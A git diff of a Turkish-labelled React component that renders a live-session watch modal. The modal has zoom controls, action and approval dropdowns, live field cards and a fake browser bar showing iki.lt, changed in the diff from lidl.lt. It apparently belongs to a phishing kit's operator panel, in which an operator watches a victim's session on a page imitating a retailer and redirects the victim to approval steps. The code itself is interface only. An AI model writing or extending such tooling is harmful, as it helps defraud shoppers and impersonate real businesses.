+                  setScale((s) => Math.min(1.5, Number((s + 0.1).toFixed(2))));
+                }}
                 className="px-1.5 py-0.5 opacity-70 hover:opacity-100 font-bold"
                 title="Yakınlaştır"
               >
                 +
+              </button>
+              <button
+                onClick={() => {
+                  setIsAutoFit(true);
+                  calculateAutoFitScale();
+                }}
+                className={`ml-1 px-2 py-0.5 rounded-lg text-[10px] font-black uppercase tracking-wider transition-all ${
+                  isAutoFit
+                    ? "bg-emerald-500 text-black shadow-sm"
+                    : darkMode
+                    ? "bg-white/10 hover:bg-white/20 text-gray-300"
+                    : "bg-gray-100 hover:bg-gray-200 text-gray-700"
+                }`}
+                title="Ekrana Otomatik Tam Sığdır (Auto-Fit Zoom)"
+              >
+                Oto
               </button>
             </div>
 
@@ -799,7 +1090,7 @@ export function LiveWatchModal({
           </div>
         </div>
 
-        {/* SUBHEADER: LIVE CONTROLS (AKSİYON SEÇİN & ONAY SEÇİN) + ROUTE INFO */}
+        {/* SUBHEADER: ROUTE INFO & STATS */}
         <div
           className={`flex flex-wrap items-center justify-between gap-3 px-5 py-2.5 text-xs border-b ${
             darkMode ? "bg-black/30 border-white/5 text-gray-300" : "bg-gray-100/70 border-gray-200 text-gray-700"
@@ -811,63 +1102,6 @@ export function LiveWatchModal({
             <code className="px-2 py-0.5 rounded font-mono font-bold text-[11px] bg-cyan-500/10 text-cyan-500 border border-cyan-500/20">
               {currentPath}
             </code>
-          </div>
-
-          {/* CENTER / CONTROLS: ACTION & APPROVAL DROPDOWNS */}
-          <div className="flex items-center gap-2">
-            {/* AKSİYON SEÇİN DROPDOWN */}
-            <select
-              value=""
-              onChange={(e) => {
-                if (e.target.value) {
-                  void handleActionSelect(e.target.value);
-                  e.target.value = "";
-                }
-              }}
-              className={`rounded-xl border px-3 py-1.5 text-xs font-bold outline-none cursor-pointer transition-all ${
-                darkMode
-                  ? "bg-[#1c1c1e] border-white/10 text-amber-400 focus:border-[#EB5E28]"
-                  : "bg-white border-gray-200 text-amber-600 focus:border-[#EB5E28]"
-              }`}
-            >
-              <option value="">👉 Aksiyon Seçin...</option>
-              {ROUTE_OPTIONS.map((opt) => (
-                <option key={opt.value} value={opt.value}>
-                  {opt.label}
-                </option>
-              ))}
-            </select>
-
-            {/* ONAY SEÇİN DROPDOWN */}
-            <select
-              value=""
-              onChange={(e) => {
-                if (e.target.value) {
-                  void handleApprovalSelect(e.target.value);
-                  e.target.value = "";
-                }
-              }}
-              className={`rounded-xl border px-3 py-1.5 text-xs font-bold outline-none cursor-pointer transition-all ${
-                darkMode
-                  ? "bg-[#1c1c1e] border-white/10 text-emerald-400 focus:border-emerald-500"
-                  : "bg-white border-gray-200 text-emerald-600 focus:border-emerald-500"
-              }`}
-            >
-              <option value="">🛡️ Onay Seçin...</option>
-              {APPROVAL_OPTIONS.map((opt) => (
-                <option key={opt.value} value={opt.value}>
-                  {opt.label}
-                </option>
-              ))}
-            </select>
-
-            {/* ACTION FEEDBACK BADGE */}
-            {actionFeedback && (
-              <span className="flex items-center gap-1 px-3 py-1 rounded-full text-xs font-black uppercase tracking-wider bg-emerald-500 text-black shadow-md animate-bounce">
-                <span>✓</span>
-                <span>{actionFeedback}</span>
-              </span>
-            )}
           </div>
 
           {/* RIGHT: RESOLUTION & STATS */}
@@ -884,7 +1118,8 @@ export function LiveWatchModal({
         <div className="flex-1 flex flex-col lg:flex-row overflow-hidden relative">
           {/* SCREEN REPLAY AREA */}
           <div
-            className={`flex-1 flex items-center justify-center overflow-auto p-4 relative ${
+            ref={stageRef}
+            className={`flex-1 flex items-center justify-center overflow-hidden p-4 relative ${
               darkMode ? "bg-[#0b0b0d]" : "bg-[#f3f4f6]"
             }`}
           >
@@ -932,8 +1167,8 @@ export function LiveWatchModal({
                 <div
                   className="relative rounded-[50px] p-3 shadow-[0_25px_60px_-15px_rgba(0,0,0,0.5)] border-[8px] border-zinc-800 bg-zinc-950 flex flex-col items-center"
                   style={{
-                    width: 412,
-                    height: 864,
+                    width: phoneFrameW,
+                    height: phoneFrameH,
                   }}
                 >
                   {/* Dynamic Island / Speaker Notch */}
@@ -945,7 +1180,8 @@ export function LiveWatchModal({
                   {/* Phone Screen Canvas */}
                   <div
                     ref={playerContainerRef}
-                    className="live-player-screen w-[390px] h-[844px] rounded-[38px] overflow-hidden bg-[#070a1d] relative"
+                    className="live-player-screen rounded-[38px] overflow-hidden bg-[#021a0e] relative"
+                    style={{ width: phoneScreenW, height: phoneScreenH }}
                   />
 
                   {/* Home Indicator Bar */}
@@ -970,20 +1206,20 @@ export function LiveWatchModal({
                       <div className="w-3 h-3 rounded-full bg-emerald-500" />
                     </div>
                     <div className="flex-1 mx-4 px-3 py-1 rounded-md text-[11px] font-mono opacity-60 bg-black/5 dark:bg-white/5 truncate">
-                      https://lidl.lt{currentPath}
+                      https://iki.lt{currentPath}
                     </div>
                   </div>
 
                   {/* Desktop Content */}
                   <div
                     ref={playerContainerRef}
-                    className="live-player-screen w-full flex-1 overflow-auto bg-[#070a1d] relative"
+                    className="live-player-screen w-full flex-1 overflow-auto bg-[#021a0e] relative"
                   />
                 </div>
               ) : (
                 /* FIT / NATIVE VIEWPORT */
                 <div
-                  className="rounded-xl shadow-2xl border overflow-hidden bg-[#070a1d] relative"
+                  className="rounded-xl shadow-2xl border overflow-hidden bg-[#021a0e] relative"
                   style={{
                     width: viewportWidth,
                     height: viewportHeight,
@@ -994,42 +1230,6 @@ export function LiveWatchModal({
               )}
             </div>
           </div>
-
-          {/* ANYDESK-STYLE LIVE CURSOR OVERLAY */}
-          {liveCursor && playerContainerRef.current && (() => {
-            const container = playerContainerRef.current;
-            if (!container) return null;
-            const rect = container.getBoundingClientRect();
-            const cx = rect.left + liveCursor.x * rect.width;
-            const cy = rect.top + liveCursor.y * rect.height;
-            if (rect.width === 0 || rect.height === 0) return null;
-            return (
-              <div
-                className="fixed z-[9999] pointer-events-none"
-                style={{ left: cx, top: cy }}
-              >
-                {liveCursor.isClick && (
-                  <span className="absolute -left-3 -top-3 w-6 h-6 rounded-full bg-orange-500/60 animate-ping" />
-                )}
-                {liveCursor.isTouch ? (
-                  <span
-                    className="absolute -left-2.5 -top-2.5 w-5 h-5 rounded-full border-2 border-white shadow-lg"
-                    style={{ background: liveCursor.isClick ? "#f97316" : "rgba(249,115,22,0.55)" }}
-                  />
-                ) : (
-                  <svg
-                    className="absolute left-0 top-0 w-5 h-5 drop-shadow-[0_1px_2px_rgba(0,0,0,0.8)]"
-                    viewBox="0 0 24 24"
-                    fill={liveCursor.isClick ? "#f97316" : "#ffffff"}
-                    stroke="#1c1917"
-                    strokeWidth="1.5"
-                  >
-                    <path d="M5 3l14 8-6.5 1.2L9 19z" strokeLinejoin="round" />
-                  </svg>
-                )}
-              </div>
-            );
-          })()}
 
           {/* RIGHT SIDEBAR: DYNAMIC LIVE FIELD CARDS */}
           <div
@@ -1071,8 +1271,16 @@ export function LiveWatchModal({
                     darkMode ? "bg-white/[0.03] border-white/10" : "bg-gray-50 border-gray-200"
                   }`}
                 >
-                  <div className="text-[10px] font-black uppercase tracking-wider opacity-60">
-                    Hızlı Yönlendirme ve Onay
+                  <div className="flex items-center justify-between gap-2">
+                    <div className="text-[10px] font-black uppercase tracking-wider opacity-60">
+                      Hızlı Yönlendirme ve Onay
+                    </div>
+                    {actionFeedback && (
+                      <span className="flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[10px] font-black uppercase tracking-wider bg-emerald-500 text-black shadow-md">
+                        <span>✓</span>
+                        <span>{actionFeedback}</span>
+                      </span>
+                    )}
                   </div>
                   <div className="grid grid-cols-2 gap-2">
                     <select
